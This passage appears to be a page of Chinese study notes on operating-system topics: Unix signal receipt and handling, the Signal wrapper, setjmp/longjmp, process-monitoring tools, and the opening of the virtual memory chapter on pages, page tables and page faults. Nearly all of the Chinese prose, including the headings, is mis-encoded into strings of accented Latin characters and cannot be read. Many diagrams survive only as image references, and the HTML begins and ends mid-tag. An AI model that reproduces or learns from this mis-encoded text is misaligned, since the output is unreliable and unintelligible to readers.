alt="image-20210616141648506"></p></li></ol><h4 id="853-æ¥æ”¶ä¿¡å·"><a class="markdownIt-Anchor" href="#853-æ¥æ”¶ä¿¡å·"></a> 8.5.3 æ¥æ”¶ä¿¡å·</h4><p>å½“å†…æ ¸ä»ä¸€ä¸ªå¼‚å¸¸å¤„ç†ç¨‹åºè¿”å›ï¼Œå‡†å¤‡å°†æ§åˆ¶ä¼ é€’ç»™è¿›ç¨‹Pæ—¶ï¼Œå®ƒä¼šæ£€æŸ¥è¿›ç¨‹Pçš„æœªè¢«é˜»å¡çš„å¾…å¤„ç†ä¿¡å·çš„é›†åˆ( pending&amp;~ blocked)ã€‚å¦‚æœè¿™ä¸ªé›†åˆä¸ºç©ºï¼ˆé€šå¸¸æƒ…å†µä¸‹ï¼‰ï¼Œé‚£ä¹ˆå†…æ ¸å°†æ§åˆ¶ä¼ é€’åˆ°pçš„é€»è¾‘æ§åˆ¶æµä¸­çš„ä¸‹ä¸€æ¡æŒ‡ä»¤(l<sub>next</sub>).<br>ç„¶è€Œï¼Œå¦‚æœé›†åˆæ˜¯éç©ºçš„ï¼Œé‚£ä¹ˆå†…æ ¸é€‰æ‹©é›†åˆä¸­çš„æŸä¸ªä¿¡å·k(é€šå¸¸æ˜¯æœ€å°çš„k),å¹¶ä¸”å¼ºåˆ¶Pæ¥æ”¶ä¿¡å·kã€‚æ”¶åˆ°è¿™ä¸ªä¿¡å·ä¼šè§¦å‘è¿›ç¨‹çš„æŸç§è¡Œä¸ºã€‚ä¸€æ—¦è¿›ç¨‹å®Œæˆäº†è¿™ä¸ªè¡Œä¸ºï¼Œé‚£ä¹ˆæ§åˆ¶å°±ä¼ é€’å›Pçš„é€»è¾‘æ§åˆ¶æµä¸­çš„ä¸‹ä¸€æ¡æŒ‡ä»¤(l<sub>next</sub>)ã€‚</p><p>æ¯ä¸ªä¿¡å·ç±»å‹éƒ½æœ‰ä¸€ä¸ªé¢„å®šä¹‰çš„<strong>é»˜è®¤è¡Œä¸º</strong>ï¼Œæ˜¯ä¸‹é¢ä¸­çš„ä¸€ç§ï¼š</p><ul><li>è¿›ç¨‹ç»ˆæ­¢ã€‚</li><li>è¿›ç¨‹ç»ˆæ­¢å¹¶è½¬å‚¨å­˜å‚¨å™¨ (dump core)ã€‚</li><li>è¿›ç¨‹åœæ­¢ç›´åˆ°è¢« SIGCONTä¿¡å·é‡å¯ã€‚</li><li>è¿›ç¨‹å¿½ç•¥è¯¥ä¿¡å·ã€‚</li></ul><p><strong>signalå‡½æ•°ï¼š</strong></p><p>è¿›ç¨‹é€šè¿‡ä½¿ç”¨ä¸€ä¸ªsignalå‡½æ•°ä¿®æ”¹å’Œä¿¡å·ç›¸å…³è”çš„é»˜è®¤è¡Œä¸º</p><p><img src="/posts/e0eae192/image-20210616143233373.png" alt="image-20210616143233373"></p><p>signalå‡½æ•°å¯ä»¥é€šè¿‡ä¸‹åˆ—ä¸‰ç§æ–¹æ³•ä¹‹ä¸€æ¥æ”¹å˜å’Œä¿¡å· signumç›¸å…³è”çš„è¡Œä¸ºï¼š</p><ul><li>å¦‚æœ handleræ˜¯SIG_IGN,é‚£ä¹ˆå¿½ç•¥ç±»å‹ä¸º signumçš„ä¿¡å·ã€‚</li><li>å¦‚æœ handleræ˜¯SIG_DFL,é‚£ä¹ˆç±»å‹ä¸º signumçš„ä¿¡å·è¡Œä¸ºæ¢å¤ä¸ºé»˜è®¤è¡Œä¸ºã€‚</li><li>å¦åˆ™ï¼Œ handlerå°±æ˜¯ç”¨æˆ·å®šä¹‰çš„å‡½æ•°çš„åœ°å€ï¼Œè¿™ä¸ªå‡½æ•°ç§°ä¸º<strong>ä¿¡å·å¤„ç†ç¨‹åº</strong>ï¼ˆ signal handler),åªè¦è¿›ç¨‹æ¥æ”¶åˆ°ä¸€ä¸ªç±»å‹ä¸º signumçš„ä¿¡å·ï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸ªç¨‹åºã€‚é€šè¿‡æŠŠå¤„ç†ç¨‹åºçš„åœ°å€ä¼ é€’åˆ° signalå‡½æ•°ä»è€Œæ”¹å˜é»˜è®¤è¡Œä¸ºï¼Œè¿™å«åš<strong>è®¾ç½®ä¿¡å·å¤„ç†ç¨‹åº</strong>ï¼ˆinstalling the handler)ã€‚è°ƒç”¨ä¿¡å·å¤„ç†ç¨‹åºç§°ä¸º<strong>æ•è·ä¿¡å·</strong>ã€‚æ‰§è¡Œä¿¡å·å¤„ç†ç¨‹åºç§°ä¸º<strong>å¤„ç†ä¿¡å·</strong>ã€‚</li></ul><p><img src="/posts/e0eae192/image-20210616150205507.png" alt="image-20210616150205507"></p><p><img src="/posts/e0eae192/image-20210616150220611.png" alt="image-20210616150220611"></p><h4 id="854-ä¿¡å·å¤„ç†é—®é¢˜"><a class="markdownIt-Anchor" href="#854-ä¿¡å·å¤„ç†é—®é¢˜"></a> 8.5.4 ä¿¡å·å¤„ç†é—®é¢˜</h4><p>è¦æ•è·å¤šä¸ªä¿¡å·çš„ä¸€äº›é—®é¢˜ï¼š</p><ul><li><strong>å¾…å¤„ç†ä¿¡å·è¢«é˜»å¡</strong>ã€‚Unixä¿¡å·å¤„ç†ç¨‹åºé€šå¸¸ä¼šé˜»å¡å½“å‰å¤„ç†ç¨‹åºæ­£åœ¨å¤„ç†çš„ç±»å‹çš„å¾…å¤„ç†ä¿¡å·ã€‚æ¯”å¦‚ï¼Œå‡è®¾ä¸€ä¸ªè¿›ç¨‹æ•è·äº†ä¸€ä¸ª SIGINTä¿¡å·ï¼Œå¹¶ä¸”å½“å‰æ­£åœ¨è¿è¡Œå®ƒçš„ SIGINTå¤„ç†ç¨‹åºã€‚å¦‚æœå¦ä¸€ä¸ª SIGINTä¿¡å·ä¼ é€’åˆ°è¿™ä¸ªè¿›ç¨‹ï¼Œé‚£ä¹ˆè¿™ä¸ª SIGINTå°†å˜æˆå¾…å¤„ç†çš„ï¼Œä½†æ˜¯ä¸ä¼šè¢«æ¥æ”¶ï¼Œç›´åˆ°å¤„ç†ç¨‹åºè¿”å›ã€‚</li><li><strong>å¾…å¤„ç†ä¿¡å·ä¸ä¼šæ’é˜Ÿç­‰å¾…</strong>ã€‚ä»»æ„ç±»å‹è‡³å¤šåªæœ‰ä¸€ä¸ªå¾…å¤„ç†ä¿¡å·ã€‚å› æ­¤ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªç±»å‹ä¸ºkçš„ä¿¡å·ä¼ é€åˆ°ä¸€ä¸ªç›®çš„è¿›ç¨‹ï¼Œè€Œç”±äºç›®çš„è¿›ç¨‹å½“å‰æ­£åœ¨æ‰§è¡Œä¿¡å·kçš„å¤„ç†ç¨‹åºï¼Œæ‰€ä»¥ä¿¡å·kæ˜¯é˜»å¡çš„ï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªä¿¡å·å°±è¢«ç®€å•åœ°ä¸¢å¼ƒï¼Œå®ƒä¸ä¼šæ’é˜Ÿç­‰å¾…ã€‚å…³é”®æ€æƒ³æ˜¯å­˜åœ¨ä¸€ä¸ªå¾…å¤„ç†çš„ä¿¡å·ä»…ä»…è¡¨æ˜è‡³å°‘å·²ç»æœ‰ä¸€ä¸ªä¿¡å·åˆ°è¾¾äº†ã€‚</li><li><strong>ç³»ç»Ÿè°ƒç”¨å¯ä»¥è¢«ä¸­æ–­</strong>ã€‚åƒreadã€waitå’Œ acceptè¿™æ ·çš„ç³»ç»Ÿè°ƒç”¨æ½œåœ¨åœ°ä¼šé˜»å¡è¿›ç¨‹ä¸€æ®µè¾ƒé•¿çš„æ—¶é—´ï¼Œç§°ä¸ºæ…¢é€Ÿç³»ç»Ÿè°ƒç”¨ã€‚åœ¨æŸäº›ç³»ç»Ÿä¸­ï¼Œå½“å¤„ç†ç¨‹åºæ•è·åˆ°ä¸€ä¸ªä¿¡å·æ—¶ï¼Œè¢«ä¸­æ–­çš„æ…¢é€Ÿç³»ç»Ÿè°ƒç”¨åœ¨ä¿¡å·å¤„ç†ç¨‹åºè¿”å›æ—¶ä¸å†ç»§ç»­ï¼Œè€Œæ˜¯ç«‹å³è¿”å›ç»™ç”¨æˆ·ä¸€ä¸ªé”™è¯¯æ¡ä»¶ï¼Œå¹¶å°† errnoè®¾ç½®ä¸º EINTRã€‚</li></ul><h4 id="855-å¯ç§»æ¤çš„ä¿¡å·å¤„ç†"><a class="markdownIt-Anchor" href="#855-å¯ç§»æ¤çš„ä¿¡å·å¤„ç†"></a> 8.5.5 å¯ç§»æ¤çš„ä¿¡å·å¤„ç†</h4><p>ä¸ºäº†å¤„ç†ä¸åŒç³»ç»Ÿä¹‹é—´ä¿¡å·å¤„ç†è¯­ä¹‰çš„å·®å¼‚ï¼Œå¯ä»¥å®šä¹‰ä¸€ä¸ªåŒ…è£…å‡½æ•°ï¼Œç§°ä¸ºSignalã€‚å®ƒçš„è°ƒç”¨æ–¹å¼å’Œsignalå‡½æ•°çš„è°ƒç”¨æ–¹å¼ä¸€æ ·ã€‚</p><p>SignalåŒ…è£…å‡½æ•°è®¾ç½®äº†ä¸€ä¸ªä¿¡å·å¤„ç†ç¨‹åºï¼Œå…¶ä¿¡å·å¤„ç†è¯­ä¹‰å¦‚ä¸‹ï¼š</p><ul><li>åªæœ‰è¿™ä¸ªå¤„ç†ç¨‹åºå½“å‰æ­£åœ¨å¤„ç†çš„é‚£ç§ç±»å‹çš„ä¿¡å·è¢«é˜»å¡</li><li>å’Œæ‰€æœ‰ä¿¡å·å®ç°ä¸€æ ·ï¼Œä¿¡å·ä¸ä¼šæ’é˜Ÿç­‰å¾…ã€‚</li><li>åªè¦å¯èƒ½ï¼Œè¢«ä¸­æ–­çš„ç³»ç»Ÿè°ƒç”¨ä¼šè‡ªåŠ¨é‡å¯ã€‚</li><li>ä¸€æ—¦è®¾ç½®äº†ä¿¡å·å¤„ç†ç¨‹åºï¼Œå®ƒå°±ä¼šä¸€ç›´ä¿æŒï¼Œç›´åˆ° Signalå¸¦ç€ handlerå‚æ•°ä¸ºSIG_IGNæˆ–è€… SIG_DFLè¢«è°ƒç”¨ã€‚ï¼ˆä¸€äº›æ¯”è¾ƒè€çš„Unâ…¸ç³»ç»Ÿä¼šåœ¨ä¸€ä¸ªå¤„ç†ç¨‹åºå¤„ç†å®Œä¸€ä¸ªä¿¡å·ä¹‹åï¼Œå°†ä¿¡å·è¡Œä¸ºæ¢å¤ä¸ºå®ƒçš„é»˜è®¤è¡Œä¸ºã€‚ï¼‰</li></ul><h4 id="856-æ˜¾ç¤ºåœ°é˜»å¡å’Œå–æ¶ˆé˜»å¡ä¿¡å·"><a class="markdownIt-Anchor" href="#856-æ˜¾ç¤ºåœ°é˜»å¡å’Œå–æ¶ˆé˜»å¡ä¿¡å·"></a> 8.5.6 æ˜¾ç¤ºåœ°é˜»å¡å’Œå–æ¶ˆé˜»å¡ä¿¡å·</h4><p><img src="/posts/e0eae192/image-20210616155200810.png" alt="image-20210616155200810"></p><h4 id="857-åŒæ­¥æµä»¥é¿å…è®¨åŒçš„å¹¶å‘é”™è¯¯"><a class="markdownIt-Anchor" href="#857-åŒæ­¥æµä»¥é¿å…è®¨åŒçš„å¹¶å‘é”™è¯¯"></a> 8.5.7 åŒæ­¥æµä»¥é¿å…è®¨åŒçš„å¹¶å‘é”™è¯¯</h4><p><img src="/posts/e0eae192/image-20210616155703781.png" alt="image-20210616155703781"></p><p><img src="/posts/e0eae192/image-20210616155808141.png" alt="image-20210616155808141"></p><p><img src="/posts/e0eae192/image-20210616155726929.png" alt="image-20210616155726929"></p><p><img src="/posts/e0eae192/image-20210616155823683.png" alt="image-20210616155823683"></p><p><img src="/posts/e0eae192/image-20210616155903713.png" alt="image-20210616155903713"></p><hr><h3 id="86-éæœ¬åœ°è·³è½¬"><a class="markdownIt-Anchor" href="#86-éæœ¬åœ°è·³è½¬"></a> 8.6 éæœ¬åœ°è·³è½¬</h3><p><strong>éæœ¬åœ°è·³è½¬ï¼š</strong></p><p>Cè¯­è¨€æä¾›äº†ä¸€ç§ç”¨æˆ·çº§å¼‚å¸¸æ§åˆ¶æµå½¢å¼ï¼Œç§°ä¸º<strong>éæœ¬åœ°è·³è½¬</strong>( nonlocal jump),å®ƒå°†æ§åˆ¶ç›´æ¥ä»ä¸€ä¸ªå‡½æ•°è½¬ç§»åˆ°å¦ä¸€ä¸ªå½“å‰æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°ï¼Œè€Œä¸éœ€è¦ç»è¿‡æ­£å¸¸çš„è°ƒç”¨ä¸€è¿”å›åºåˆ—ã€‚éæœ¬åœ°è·³è½¬æ˜¯é€šè¿‡ setjmpå’Œlongjmpå‡½æ•°æ¥æä¾›çš„ã€‚</p><p><img src="/posts/e0eae192/image-20210616160043032.png" alt="image-20210616160043032"></p><ul><li><p>éæœ¬åœ°è·³è½¬çš„ä¸€ä¸ªé‡è¦åº”ç”¨ï¼šå…è®¸ä»ä¸€ä¸ªæ·±å±‚åµŒå¥—çš„å‡½æ•°è°ƒç”¨ä¸­ç«‹å³è¿”å›ï¼Œé€šå¸¸æ˜¯ç”±æ£€æµ‹åˆ°æŸä¸ªé”™è¯¯æƒ…å†µå¼•èµ·çš„ã€‚</p></li><li><p>éæœ¬åœ°è·³è½¬çš„å¦ä¸€ä¸ªé‡è¦åº”ç”¨ï¼šæ˜¯ä½¿ä¸€ä¸ªä¿¡å·å¤„ç†ç¨‹åºåˆ†æ”¯åˆ°ä¸€ä¸ªç‰¹æ®Šçš„ä»£ç ä½ç½®ï¼Œè€Œä¸æ˜¯è¿”å›åˆ°è¢«ä¿¡å·åˆ°è¾¾ä¸­æ–­äº†çš„æŒ‡ä»¤çš„ä½ç½®ã€‚</p></li></ul><h3 id="87-æ“ä½œè¿›ç¨‹çš„å·¥å…·"><a class="markdownIt-Anchor" href="#87-æ“ä½œè¿›ç¨‹çš„å·¥å…·"></a> 8.7 æ“ä½œè¿›ç¨‹çš„å·¥å…·</h3><p>Linuxç³»ç»Ÿæä¾›äº†å¤§é‡çš„ç›‘æ§å’Œæ“ä½œè¿›ç¨‹çš„æœ‰ç”¨å·¥å…·ï¼š</p><ul><li><strong>STRACE</strong>: æ‰“å°ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„ç¨‹åºå’Œå®ƒçš„å­è¿›ç¨‹è°ƒç”¨çš„æ¯ä¸ªç³»ç»Ÿè°ƒç”¨çš„è½¨è¿¹ã€‚å¯¹äºå¥½å¥‡çš„å­¦ç”Ÿè€Œè¨€ï¼Œè¿™æ˜¯ä¸€ä¸ªä»¤äººç€è¿·çš„å·¥å…·ã€‚ç”¨- staticç¼–è¯‘ä½ çš„ç¨‹åºï¼Œèƒ½å¾—åˆ°ä¸€ä¸ªæ›´å¹²å‡€çš„ã€ä¸å¸¦æœ‰å¤§é‡ä¸å…±äº«åº“ç›¸å…³çš„è¾“å‡ºçš„è½¨è¿¹ã€‚</li><li><strong>PS</strong>: åˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­çš„è¿›ç¨‹ï¼ˆåŒ…æ‹¬åƒµæ­»è¿›ç¨‹ï¼‰ã€‚</li><li><strong>TOP</strong>: æ‰“å°å‡ºå…³äºå½“å‰è¿›ç¨‹èµ„æºä½¿ç”¨çš„ä¿¡æ¯</li><li><strong>PMAP</strong>: æ˜¾ç¤ºè¿›ç¨‹çš„å­˜å‚¨å™¨æ˜ å°„ã€‚</li><li>/<strong>proc</strong>: ä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œä»¥ASCIIæ–‡æœ¬æ ¼å¼è¾“å‡ºå¤§é‡å†…æ ¸æ•°æ®ç»“æ„çš„å†…å®¹ï¼Œç”¨æˆ·ç¨‹åºå¯ä»¥è¯»å–è¿™äº›å†…å®¹ã€‚æ¯”å¦‚ï¼Œè¾“å…¥â€œcat/proc/loadavgâ€ï¼Œè§‚å¯Ÿåœ¨Linuxç³»ç»Ÿä¸Šå½“å‰çš„å¹³å‡è´Ÿè½½ã€‚</li></ul><hr><h2 id="ç¬¬ä¹ç« -è™šæ‹Ÿå­˜å‚¨å™¨"><a class="markdownIt-Anchor" href="#ç¬¬ä¹ç« -è™šæ‹Ÿå­˜å‚¨å™¨"></a> ç¬¬ä¹ç«  è™šæ‹Ÿå­˜å‚¨å™¨</h2><h3 id="91-ç‰©ç†å’Œè™šæ‹Ÿå¯»å€"><a class="markdownIt-Anchor" href="#91-ç‰©ç†å’Œè™šæ‹Ÿå¯»å€"></a> 9.1 ç‰©ç†å’Œè™šæ‹Ÿå¯»å€</h3><p><strong>ç‰©ç†å¯»å€ï¼š</strong></p><p><img src="/posts/e0eae192/image-20210616173343847.png" alt="image-20210616173343847"></p><p><strong>è™šæ‹Ÿå¯»å€ï¼š</strong></p><p>ä½¿ç”¨è™šæ‹Ÿå¯»å€æ—¶ï¼ŒCPUé€šè¿‡ç”Ÿæˆä¸€ä¸ªè™šæ‹Ÿåœ°å€( Virtual Address,VA)æ¥è®¿é—®ä¸»å­˜ï¼Œè¿™ä¸ªè™šæ‹Ÿåœ°å€åœ¨è¢«é€åˆ°å­˜å‚¨å™¨ä¹‹å‰å…ˆè½¬æ¢æˆé€‚å½“çš„ç‰©ç†åœ°å€ã€‚å°†ä¸€ä¸ªè™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€çš„ä»»åŠ¡å«åšåœ°å€ç¿»è¯‘(address translation)ã€‚</p><p><img src="/posts/e0eae192/image-20210616173400967.png" alt="image-20210616173400967"></p><hr><h3 id="92-åœ°å€ç©ºé—´"><a class="markdownIt-Anchor" href="#92-åœ°å€ç©ºé—´"></a> 9.2 åœ°å€ç©ºé—´</h3><p>åœ°å€ç©ºé—´æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°çš„æœ‰åºé›†åˆï¼š</p><p>{0,1,2ï¼ŒÂ·Â·Â·}</p><p>è™šæ‹Ÿåœ°å€ç©ºé—´ï¼š{0,1,2ï¼ŒÂ·Â·Â·ï¼ŒN-1}</p><p>ç‰©ç†åœ°å€ç©ºé—´ï¼š{0,1,2ï¼ŒÂ·Â·Â·ï¼ŒM-1}</p><p>åœ°å€ç©ºé—´çš„æ¦‚å¿µæ˜¯å¾ˆé‡è¦çš„ï¼Œå› ä¸ºå®ƒæ¸…æ¥šåœ°åŒºåˆ†äº†æ•°æ®å¯¹è±¡ï¼ˆå­—èŠ‚ï¼‰å’Œå®ƒä»¬çš„å±æ€§ï¼ˆåœ°å€ï¼‰ã€‚ä¸€æ—¦è®¤è¯†åˆ°äº†è¿™ç§åŒºåˆ«ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†å…¶æ¨å¹¿ï¼Œå…è®¸æ¯ä¸ªæ•°æ®å¯¹è±¡æœ‰å¤šä¸ªç‹¬ç«‹çš„åœ°å€ï¼Œå…¶ä¸­æ¯ä¸ªåœ°å€éƒ½é€‰è‡ªä¸€ä¸ªä¸åŒçš„åœ°å€ç©ºé—´ã€‚è¿™å°±æ˜¯è™šæ‹Ÿå­˜å‚¨å™¨çš„åŸºæœ¬æ€æƒ³ã€‚ä¸»å­˜ä¸­çš„æ¯ä¸ªå­—èŠ‚éƒ½æœ‰ä¸ªé€‰è‡ªè™šæ‹Ÿåœ°å€ç©ºé—´çš„è™šæ‹Ÿåœ°å€å’Œä¸€ä¸ªé€‰è‡ªç‰©ç†åœ°å€ç©ºé—´çš„ç‰©ç†åœ°å€ã€‚</p><hr><h3 id="93-è™šæ‹Ÿå­˜å‚¨å™¨ä½œä¸ºç¼“å­˜çš„å·¥å…·"><a class="markdownIt-Anchor" href="#93-è™šæ‹Ÿå­˜å‚¨å™¨ä½œä¸ºç¼“å­˜çš„å·¥å…·"></a> 9.3 è™šæ‹Ÿå­˜å‚¨å™¨ä½œä¸ºç¼“å­˜çš„å·¥å…·</h3><p><strong>è™šæ‹Ÿå­˜å‚¨å™¨</strong>(VM)è¢«ç»„ç»‡ä¸ºä¸€ä¸ªç”±å­˜æ”¾åœ¨ç£ç›˜ä¸Šçš„Nä¸ªè¿ç»­çš„å­—èŠ‚å¤§å°çš„å•å…ƒç»„æˆçš„æ•°ç»„ã€‚æ¯å­—èŠ‚éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„è™šæ‹Ÿåœ°å€ï¼Œè¿™ä¸ªå”¯ä¸€çš„è™šæ‹Ÿåœ°å€æ˜¯ä½œä¸ºåˆ°æ•°ç»„çš„ç´¢å¼•çš„ã€‚</p><p>VMç³»ç»Ÿå°†è™šæ‹Ÿå­˜å‚¨å™¨åˆ†å‰²ä¸ºç§°ä¸º<strong>è™šæ‹Ÿé¡µ</strong>( Virtual Page,VP)çš„å¤§å°å›ºå®šçš„å—ã€‚æ¯ä¸ªè™šæ‹Ÿé¡µçš„å¤§å°ä¸ºP=2<sup>p</sup>å­—èŠ‚ã€‚</p><p>ç±»ä¼¼åœ°ï¼Œç‰©ç†å­˜å‚¨å™¨è¢«åˆ†å‰²ä¸º<strong>ç‰©ç†é¡µ</strong>( Physical Page,PP),å¤§å°ä¹Ÿä¸ºPå­—èŠ‚ï¼ˆç‰©ç†é¡µä¹Ÿç§°ä¸ºé¡µå¸§( page frame))ã€‚</p><p>ä¸€ä¸ªnä½çš„åœ°å€ç©ºé—´æœ‰2<sup>n-p</sup>é¡µ</p><p>åœ¨ä»»æ„æ—¶åˆ»ï¼Œè™šæ‹Ÿé¡µé¢çš„é›†åˆéƒ½åˆ†ä¸ºä¸‰ä¸ªä¸ç›¸äº¤çš„å­é›†ï¼š</p><ul><li><strong>æœªåˆ†é…çš„</strong>ï¼šVMç³»ç»Ÿè¿˜æœªåˆ†é…ï¼ˆæˆ–è€…åˆ›å»ºï¼‰çš„é¡µã€‚æœªåˆ†é…çš„å—æ²¡æœ‰ä»»ä½•æ•°æ®å’Œå®ƒä»¬ç›¸å…³è”ï¼Œå› æ­¤ä¹Ÿå°±ä¸å ç”¨ä»»ä½•ç£ç›˜ç©ºé—´ã€‚</li><li><strong>ç¼“å­˜çš„</strong>ï¼šå½“å‰ç¼“å­˜åœ¨ç‰©ç†å­˜å‚¨å™¨ä¸­çš„å·²åˆ†é…é¡µã€‚</li><li><strong>æœªç¼“å­˜çš„</strong>ï¼šæ²¡æœ‰ç¼“å­˜åœ¨ç‰©ç†å­˜å‚¨å™¨ä¸­çš„å·²åˆ†é…é¡µã€‚</li></ul><p><img src="/posts/e0eae192/image-20210616175211113.png" alt="image-20210616175211113"></p><h4 id="931-dramç¼“å­˜çš„ç»„ç»‡ç»“æ„"><a class="markdownIt-Anchor" href="#931-dramç¼“å­˜çš„ç»„ç»‡ç»“æ„"></a> 9.3.1 DRAMç¼“å­˜çš„ç»„ç»‡ç»“æ„</h4><p>SRAMç¼“å­˜ï¼šä½äºCPUå’Œä¸»å­˜ä¹‹é—´çš„L1ã€L2å’ŒL3é«˜é€Ÿç¼“å­˜</p><p>DRAMç¼“å­˜ï¼šè™šæ‹Ÿå­˜å‚¨å™¨ç³»ç»Ÿçš„ç¼“å­˜ï¼Œå®ƒåœ¨ä¸»å­˜ä¸­ç¼“å­˜è™šæ‹Ÿé¡µ</p><p><strong>DRAMç¼“å­˜çš„ç»„ç»‡ç»“æ„ï¼š</strong></p><ul><li>SRAMæ¯”DRAMå¿«å¤§çº¦10å€ï¼ŒDRAMè¦æ¯”ç£ç›˜å¿«å¤§çº¦100000å¤šå€</li><li>å·¨å¤§çš„ä¸å‘½ä¸­å¤„ç½šå’Œè®¿é—®ç¬¬ä¸€å­—èŠ‚çš„å¼€é”€</li><li>ç”±äºå¤§çš„ä¸å‘½ä¸­å¤„ç½šï¼ŒDRAMç¼“å­˜æ˜¯å…¨ç›¸è¿çš„</li><li>ä½¿ç”¨å†™å›è€Œä¸æ˜¯ç›´å†™</li></ul><h4 id="932-é¡µè¡¨"><a class="markdownIt-Anchor" href="#932-é¡µè¡¨"></a> 9.3.2 é¡µè¡¨</h4><p>é¡µè¡¨å­˜æ”¾åœ¨<strong>ç‰©ç†å­˜å‚¨å™¨</strong>ä¸­</p><p><strong>é¡µè¡¨</strong>å°±æ˜¯ä¸€ä¸ª<strong>é¡µè¡¨æ¡ç›®</strong>ï¼ˆPTEï¼‰çš„æ•°ç»„ï¼Œè´Ÿè´£å°†è™šæ‹Ÿé¡µæ˜ å°„åˆ°ç‰©ç†é¡µã€‚æ¯æ¬¡åœ°å€ç¿»è¯‘è½¯ä»¶å°†ä¸€ä¸ªè™šæ‹Ÿåœ°å€è½¬æ¢æˆç‰©ç†åœ°å€æ—¶éƒ½ä¼šè¯»å–é¡µè¡¨ã€‚æ“ä½œç³»ç»Ÿè´Ÿè´£ç»´æŠ¤é¡µè¡¨çš„å†…å®¹ï¼Œä»¥åŠåœ¨ç£ç›˜å’ŒDRAMä¹‹é—´æ¥å›ä¼ é€é¡µã€‚</p><p>æ¯ä¸ªPTEç”±ä¸€ä¸ªæœ‰æ•ˆä½å’Œä¸€ä¸ªnä½åœ°å€å­—æ®µç»„æˆ</p><ul><li><p>è®¾ç½®äº†æœ‰æ•ˆä½ï¼ˆå·²ç¼“å­˜ï¼‰</p><p>è¡¨æ˜è¯¥è™šæ‹Ÿé¡µè¢«ç¼“å­˜åœ¨DRAMä¸­ï¼Œåœ°å€å­—æ®µè¡¨ç¤ºDRAMä¸­ç›¸åº”çš„ç‰©ç†é¡µçš„èµ·å§‹ä½ç½®ï¼Œè¿™ä¸ªç‰©ç†é¡µç¼“å­˜äº†è¯¥è™šæ‹Ÿé¡µ</p></li><li><p>æœªè®¾ç½®æœ‰æ•ˆä½ï¼ˆè¿˜æœªè¢«ç¼“å­˜ï¼‰</p><ul><li>ä¸€ä¸ªç©ºåœ°å€è¡¨ç¤ºè¿™ä¸ªè™šæ‹Ÿé¡µè¿˜æœªè¢«åˆ†é…</li><li>å¦åˆ™è¿™ä¸ªåœ°å€æŒ‡å‘è¯¥è™šæ‹Ÿé¡µåœ¨ç£ç›˜ä¸Šçš„èµ·å§‹ä½ç½®ï¼ˆå·²åˆ†é…æœªç¼“å­˜ï¼‰</li></ul></li></ul><p><img src="/posts/e0eae192/image-20210616211103583.png" alt="image-20210616211103583"></p><h4 id="933-é¡µå‘½ä¸­"><a class="markdownIt-Anchor" href="#933-é¡µå‘½ä¸­"></a> 9.3.3 é¡µå‘½ä¸­</h4><p>åœ°å€ç¿»è¯‘ç¡¬ä»¶å°†è™šæ‹Ÿåœ°å€ä½œä¸ºä¸€ä¸ªç´¢å¼•æ¥å®šä½PTE 2,å¹¶ä»å­˜å‚¨å™¨ä¸­è¯»å–å®ƒã€‚å› ä¸ºè®¾ç½®äº†æœ‰æ•ˆä½ï¼Œé‚£ä¹ˆåœ°å€ç¿»è¯‘ç¡¬ä»¶å°±çŸ¥é“VP 2æ˜¯ç¼“å­˜åœ¨å­˜å‚¨å™¨ä¸­çš„äº†ã€‚æ‰€ä»¥å®ƒä½¿ç”¨PTEä¸­çš„ç‰©ç†å­˜å‚¨å™¨åœ°å€ï¼ˆè¯¥åœ°å€æŒ‡å‘PP 1ä¸­ç¼“å­˜é¡µçš„èµ·å§‹ä½ç½®ï¼‰ï¼Œæ„é€ å‡ºè¿™ä¸ªå­—çš„ç‰©ç†åœ°å€ã€‚</p><h4 id="934-ç¼ºé¡µ"><a class="markdownIt-Anchor" href="#934-ç¼ºé¡µ"></a> 9.3.4 ç¼ºé¡µ</h4><p>DRAMç¼“å­˜ä¸å‘½ä¸­ç§°ä¸º<strong>ç¼ºé¡µ</strong></p><p>å‘ç°ç¼ºé¡µåè§¦å‘ä¸€ä¸ªç¼ºé¡µå¼‚å¸¸ï¼Œè°ƒç”¨å†…æ ¸ä¸­çš„ç¼ºé¡µå¼‚å¸¸å¤„ç†ç¨‹åºï¼Œåœ¨ç‰©ç†é¡µä¸­é€‰æ‹©ä¸€ä¸ªç‰ºç‰²é¡µï¼Œå¦‚æœç‰ºç‰²é¡µè¢«ä¿®æ”¹è¿‡äº†åˆ™å°†ç‰ºç‰²é¡µä¿å­˜å›ç£ç›˜ï¼Œæ— è®ºæ˜¯å¦ä¿®æ”¹ï¼Œå†…æ ¸éƒ½ä¼šä¿®æ”¹ç‰ºç‰²é¡µçš„PTEï¼Œç„¶åå°†ç›®æ ‡è™šæ‹Ÿé¡µç¼“å­˜åˆ°ç£ç›˜ä¸­å¯¹åº”çš„ç‰©ç†é¡µï¼Œæ›´æ–°ç›®æ ‡é¡µçš„PTEï¼Œç„¶åå¼‚å¸¸å¤„ç†ç¨‹åºè¿”å›ï¼Œå®ƒä¼šé‡æ–°å¯åŠ¨å¯¼è‡´ç¼ºé¡µçš„æŒ‡ä»¤ã€‚</p><p><strong>äº¤æ¢</strong>( swapping)æˆ–è€…<strong>é¡µé¢è°ƒåº¦</strong>( paging)ï¼šåœ¨ç£ç›˜å’Œå­˜å‚¨å™¨ä¹‹é—´ä¼ é€é¡µçš„æ´»åŠ¨ã€‚</p><p>é¡µä»ç£ç›˜æ¢å…¥ï¼ˆæˆ–è€…é¡µé¢è°ƒå…¥ï¼‰DRAMå’Œä»DRAMæ¢å‡ºï¼ˆæˆ–è€…é¡µé¢è°ƒå‡ºï¼‰ç£ç›˜ã€‚</p><p>**æŒ‰éœ€é¡µé¢è°ƒåº¦ï¼š**ä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°æœ€åæ—¶åˆ»ï¼Œä¹Ÿå°±æ˜¯å½“æœ‰ä¸å‘½ä¸­å‘ç”Ÿæ—¶ï¼Œæ‰æ¢å…¥é¡µé¢çš„ä¸€ç§ç­–ç•¥</p><h4 id="935-åˆ†é…é¡µé¢"><a class="markdownIt-Anchor" 